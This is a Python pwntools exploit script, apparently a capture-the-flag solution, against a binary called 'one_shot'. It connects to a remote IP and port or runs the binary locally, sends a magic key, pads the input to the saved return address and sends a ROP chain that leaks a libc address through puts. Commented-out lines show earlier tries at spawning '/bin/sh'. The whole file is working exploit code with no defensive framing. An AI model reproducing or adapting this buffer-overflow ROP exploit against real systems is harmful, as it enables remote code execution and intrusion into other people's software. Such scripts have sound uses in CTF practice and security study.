#!/usr/bin/env python2

from pwn import *

context.clear(arch="amd64")
context.terminal = ["xfce4-terminal", "-e"]
exe = ELF("one_shot")

if args.REMOTE:
    libc = ELF("libc-2.24.so")
    io = remote("178.128.87.12", 31338)
else:
    libc = ELF("/usr/lib/libc.so.6")
    io = process("one_shot")

# send this string at the beginning
KEY = "\x8A\x91\x9F\xF0"[::-1]

# buffer size
READ_SIZE = 0x234

# RIP offset
RIP_OFFSET = cyclic_find("iaab")

libc_rop = ROP(libc)
exe_rop = ROP(exe)
#rop.mprotect(0x7fffffffe3c4, 0x1000, 7)
#rop.raw(0x7fffffffe3c4)

#rop.fopen(next(libc.search("/dev/null\x00")), next(libc.search("r\x00")))
#rop.fopen(next(libc.search("/dev/tty\x00")), next(libc.search("w\x00")))
#rop.write(1, next(libc.search("/dev/tty\x00")), 8)
#rop.fsync(1)

#rop.execve(next(libc.search("/bin/sh\x00")))
exe_rop.puts(0x601018)
exe_rop.raw(0x04007E0)
exe_rop.exit(0)

log.info(libc_rop.dump())
log.info(exe_rop.dump())

rop = libc_rop.chain() + exe_rop.chain()


shell = ""
payload = KEY + shell + cyclic(RIP_OFFSET - len(shell)) + rop

with open("test.txt", "w") as f:
    f.write(payload)
    f.flush()

io.recvuntil("> ")
io.sendline(payload)

io.interactive()
